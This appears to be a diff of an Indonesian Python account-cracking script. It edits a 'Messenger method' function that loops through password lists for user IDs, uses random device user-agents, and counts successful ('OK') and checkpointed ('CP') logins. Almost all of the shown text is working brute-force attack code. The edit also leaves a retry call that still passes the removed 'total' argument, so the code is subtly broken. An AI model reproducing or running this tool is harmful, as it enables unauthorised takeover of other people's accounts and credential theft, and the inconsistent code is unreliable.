@@ -1852,7 +1852,7 @@ def metcepat():
                 elif "mbasik" in method:
                     pool.submit(mobile, idf, pwv)
                 elif "regulerv2" in method:
-                    pool.submit(main_alpha,id2, idf, pwv)
+                    pool.submit(main_alpha,idf, pwv)
                 else:
                     pool.submit(mobile, idf, pwv)
     print("")
@@ -1872,9 +1872,11 @@ def metcepat():
 
 
 # Crack Dengan Metode Messenger
-def main_alpha(total, idf, pwv):
+def main_alpha(idf, pwv):
 	global Looping, Ok, Cp,loop, ok, cp
 	try:
+		prog.update(des,description=f" {K2}•{H2} M_ALPHA {SE}{SE}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
+		prog.advance(des)
 		for pw in pwv:
 			with requests.Session() as r:
 				acak_device = random.choice(['Windows NT 10.0; Win64; x64', 'Windows NT 10.0; WOW64', 'Windows NT 10.0', 'Macintosh; Intel Mac OS X 13_2', 'X11; Linux x86_64'])
@@ -1951,7 +1953,6 @@ def main_alpha(total, idf, pwv):
 				else:
 					continue
 			Looping += 1
-		print(f"[bold white][Crack] [bold blue]{idf}[bold white]/[bold blue]{str(len(total))}[bold white]/[bold blue]{Looping}[bold white] Ok-:[bold green]{len(Ok)}[bold white] Cp-:[bold yellow]{len(Cp)}               ", end='\r')
 	except (RequestException) as e:
 		print("[bold white][[bold red]![bold white]][bold red] Koneksi Error...                            ", end='\r');time.sleep(7.5);main_alpha(total, idf, pwv)
 # --------------------[ METODE MOBILE ]-----------------#
